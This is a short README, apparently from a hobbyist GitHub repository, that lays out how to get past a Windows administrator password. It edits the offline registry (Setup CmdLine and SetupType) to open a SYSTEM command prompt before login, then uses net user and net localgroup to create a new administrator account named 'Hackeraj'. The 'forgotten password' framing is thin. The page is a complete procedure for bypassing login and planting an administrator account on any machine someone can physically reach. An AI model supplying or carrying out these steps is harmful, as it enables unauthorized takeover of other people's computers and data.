# Bypass_Windows_Administrator_Password

***Bypass Windows Administrator Password a forgotten PIN, Microsoft account password in cmd with a local account***

### Concepts

- Shift + F10
- Type regedit
- Click on `HKEY_LOCAL_MACHINE`
- Go To File & Load Hive & Go To `c:\\windows\system32\config\system` 
- Put Key Name `e.g Hackeraj`
- Open `HKEY_LOCAL_MACHINE
- Go To Key Name `Hackeraj` -> Go To `Setup`
- Click on `CmdLine` and Put `cmd.exe` in the Value Data
- Click on `SetupType` and Put `1` or `2` in the Value Data
- Click on `Hackeraj`
- Go To File & Click on Unload Hive
- Exit / Restart
- Infront of You Command Prompt. So, First see users Type `net user` 
- Then we need to create a account Type net user username password e.g `net user Hackeraj 12345 /add` or `control userpasswords2`
- Then need to give Administrator Access this local account `Hackeraj` e.g `net localgroup Administrators Hackeraj /add`
- Game Over
	
### Tested on

- Windows 7
- Windows 10

# :octocat: Author
1. [Hackeraj](https://www.facebook.com/raazkapoorkushwaha/)


[Facebook](https://www.facebook.com/HackerajOfficial/)
[Twitter](https://twitter.com/Hackerajnp/)
[Instagram](https://www.instagram.com/hackerajofficial/)
[Youtube](https://www.youtube.com/HackerajOfficial/)
[Github](https://www.github.com/HackerajOfficial/)
